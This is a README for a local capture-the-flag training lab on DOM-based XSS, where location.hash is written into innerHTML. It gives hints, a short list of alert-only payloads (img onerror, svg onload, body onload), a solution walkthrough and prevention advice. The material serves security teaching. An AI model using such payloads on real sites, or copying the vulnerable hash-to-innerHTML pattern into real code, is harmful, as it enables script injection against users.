# DOM Hash XSS Lab

## 📋 Lab Information

| Attribute | Value |
|-----------|-------|
| **Level** | Easy |
| **Topic** | Cross-Site Scripting (XSS) |
| **Technique** | DOM-based XSS via `location.hash` + `innerHTML` |
| **Port** | 8019 |
| **Flag Format** | `IDS{********}` |

---

## 🎯 Lab Description

This lab demonstrates a **DOM-based XSS vulnerability** where user input from the URL fragment (hash) is unsafely inserted into the page using the `innerHTML` property.

### The Vulnerability

The application reads `location.hash` (the part after `#` in the URL) and directly assigns it to an element's `innerHTML` property without any sanitization. This allows an attacker to inject arbitrary HTML and JavaScript code that will be executed in the victim's browser.

**Source:** `location.hash`
**Sink:** `element.innerHTML`

### Why This Matters

DOM-based XSS is particularly dangerous because:
- The malicious payload never reaches the server
- Traditional server-side filters won't catch it
- It can bypass Web Application Firewalls (WAF)
- The vulnerability exists entirely in client-side code

---

## 🎓 Learning Objectives

After completing this lab, you will understand:

1. **DOM XSS vs Reflected/Stored XSS** - How DOM XSS differs from traditional XSS
2. **URL Fragments** - What `location.hash` contains and how it's used
3. **Sources and Sinks** - Identifying dangerous data flows in JavaScript
4. **innerHTML Risks** - Why `innerHTML` is dangerous with user input
5. **Client-side Filtering Bypass** - Why client-side validation isn't enough

---

## 💡 Hints

<details>
<summary>Hint 1: Understanding URL Fragments</summary>

The URL fragment is everything after the `#` symbol. For example:
- URL: `http://example.com/page#<b>test</b>`
- `location.hash` = `#<b>test</b>`
- After removing `#`: `<b>test</b>`

When this is inserted via `innerHTML`, the HTML tags are rendered!
</details>

<details>
<summary>Hint 2: The Sink</summary>

The vulnerable code uses:
```javascript
element.innerHTML = hashContent;
```

This means any HTML tags in your payload will be rendered as HTML, not as text.
</details>

<details>
<summary>Hint 3: Automatic Execution</summary>

Some HTML elements execute JavaScript automatically:
- `<img>` with `onerror` attribute
- `<svg>` with `onload` attribute
- `<body>` with `onload` attribute

These don't require user interaction!
</details>

<details>
<summary>Hint 4: URL Encoding</summary>

Special characters in URLs are automatically encoded. The lab decodes them with `decodeURIComponent()`, so you can use:
- `%3C` for `<`
- `%3E` for `>`
- Or just type them directly in modern browsers
</details>

<details>
<summary>Hint 5: Payload Structure</summary>

Your payload should be HTML that executes JavaScript:

```html
<img src=x onerror="alert('XSS_SUCCESS')">
```

Put this after the `#` in the URL.
</details>

---

## 🚀 Quick Start

### Access the Lab

```
http://localhost:8019/
```

### Basic Exploitation Steps

1. **Visit the lab** and observe the page
2. **Add a simple hash** to test: `#hello`
3. **Try HTML injection:** `#<b>bold text</b>`
4. **Craft your XSS payload** using an HTML tag with event handler
5. **Execute JavaScript** to trigger the flag
6. **Receive the flag** in an alert dialog

---

## 📝 Example Payloads

### Level 1: Basic HTML Injection (Test)
```
#<b>bold</b>
#<i>italic</i>
```

### Level 2: Image with Error Handler (XSS)
```
#<img src=x onerror="alert('XSS_SUCCESS')">
```

### Level 3: SVG with Onload (XSS)
```
#<svg onload="alert('XSS_SUCCESS')">
```

### Level 4: Body Onload (XSS)
```
#<body onload="alert('XSS_SUCCESS')">
```

### Level 5: With URL Encoding
```
#%3Cimg%20src%3Dx%20onerror%3D%22alert('XSS_SUCCESS')%22%3E
```

---

## 🔍 Solution Walkthrough

<details>
<summary>Click to reveal full solution</summary>

### Step 1: Analyze the Vulnerability

Looking at the source code, we find:
```javascript
let hashContent = location.hash.substring(1);
hashContent = decodeURIComponent(hashContent);
_displayElement.innerHTML = hashContent;
```

The flow is:
1. **Source:** `location.hash` - controlled by user via URL
2. **Transform:** Remove `#`, decode URL encoding
3. **Sink:** `innerHTML` - renders HTML and executes JavaScript

### Step 2: Test HTML Injection

Visit: `http://localhost:8019/#<b>test</b>`

Result: The word "test" appears in bold, confirming HTML injection works!

### Step 3: Craft XSS Payload

We need HTML that:
- Renders as valid HTML
- Executes JavaScript automatically
- Contains our trigger string `XSS_SUCCESS`

Using `<img>` with `onerror`:
```html
<img src=x onerror="alert('XSS_SUCCESS')">
```

### Step 4: Execute the Exploit

Visit: `http://localhost:8019/#<img src=x onerror="alert('XSS_SUCCESS')">`

The browser:
1. Loads the page
2. Reads `#<img src=x onerror="alert('XSS_SUCCESS')">`
3. Inserts it via `innerHTML`
4. Tries to load image from `src="x"` (fails)
5. Triggers `onerror` handler
6. Executes `alert('XSS_SUCCESS')`
7. The validation function intercepts the alert
8. Flag is displayed: `IDS{...}`

### Step 5: Capture the Flag

The alert will show:
```
🎯 FLAG: IDS{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

Copy this flag to complete the lab!

</details>

---

## 🛠️ Technical Deep Dive

### Source: `location.hash`

The `location.hash` property returns the anchor portion of a URL, including the `#` symbol. This is entirely client-side and never sent to the server.

### Sink: `innerHTML`

The `innerHTML` property sets or gets the HTML markup contained within an element. When you assign a value to `innerHTML`, the browser:
1. Parses the string as HTML
2. Creates DOM elements
3. **Executes any JavaScript** in event handlers

### Why This Vulnerability Exists

```javascript
// VULNERABLE CODE
element.innerHTML = userInput;  // ❌ Danger!

// SECURE ALTERNATIVES
element.textContent = userInput;  // ✅ Safe - treats as text
element.innerText = userInput;    // ✅ Safe - treats as text
```

### Modern Fix: DOMPurify

```javascript
import DOMPurify from 'dompurify';

// Safe HTML rendering
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;  // ✅ Safe - sanitized
```

---

## 🐳 Docker Setup

### Using Docker Compose

The lab is included in the main `docker-compose.yml`:

```bash
# Start the lab
docker compose up -d hash-innerhtml-xss-lab

# View logs
docker compose logs -f hash-innerhtml-xss-lab

# Stop the lab
docker compose stop hash-innerhtml-xss-lab
```

### Manual Docker Build

```bash
cd hash_innerhtml_xss_lab
docker build -t hash-xss-lab .
docker run -p 8019:80 hash-xss-lab
```

### Manual PHP Server

```bash
cd hash_innerhtml_xss_lab
php -S localhost:8019
```

---

## 📊 Comparison: XSS Types

| Type | Where Vulnerability Exists | Server Involvement | Detection Difficulty |
|------|---------------------------|-------------------|---------------------|
| **Reflected XSS** | Server-side code | Required | Easy - in server response |
| **Stored XSS** | Server-side code | Required | Easy - in stored data |
| **DOM XSS** | Client-side JavaScript | Not required | Hard - no server trace |

This lab demonstrates **DOM XSS** - the payload is processed entirely in the browser!

---

## ✅ Completion Checklist

- [x] Understood URL fragments (`location.hash`)
- [x] Identified the source → sink data flow
- [x] Tested basic HTML injection
- [x] Crafted XSS payload with `onerror` handler
- [x] Successfully executed JavaScript
- [x] Retrieved the flag via alert
- [x] Learned about DOM-based XSS prevention

---

## 🔐 Prevention

### Code-Level Fixes

```javascript
// Option 1: Use textContent (safest)
element.textContent = location.hash.substring(1);

// Option 2: Sanitize with DOMPurify
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(location.hash.substring(1));

// Option 3: Manual sanitization (not recommended)
function sanitizeHTML(str) {
    const temp = document.createElement('div');
    temp.textContent = str;
    return temp.innerHTML;
}
element.innerHTML = sanitizeHTML(location.hash.substring(1));
```

### Security Best Practices

1. **Never trust client-side input** - Always sanitize
2. **Avoid innerHTML** - Use textContent when possible
3. **Use Content Security Policy** - Add CSP headers
4. **Implement DOMPurify** - For necessary HTML rendering
5. **Security Code Review** - Check all source → sink flows

---

## 📚 Additional Resources

- [OWASP DOM-based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
- [PortSwigger: DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [MDN: innerHTML security](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML)
- [DOMPurify Library](https://github.com/cure53/DOMPurify)

---

## ⚠️ Important Notes

- This lab is for **educational purposes only**
- DOM XSS vulnerabilities are common in real-world applications
- Always sanitize user input, even if it's client-side only
- Modern browsers have some protections, but don't rely on them
- The flag is generated dynamically and changes on each server restart

---

**Last Updated:** 2025-02-08
**Difficulty:** Easy
**Estimated Time:** 10-15 minutes
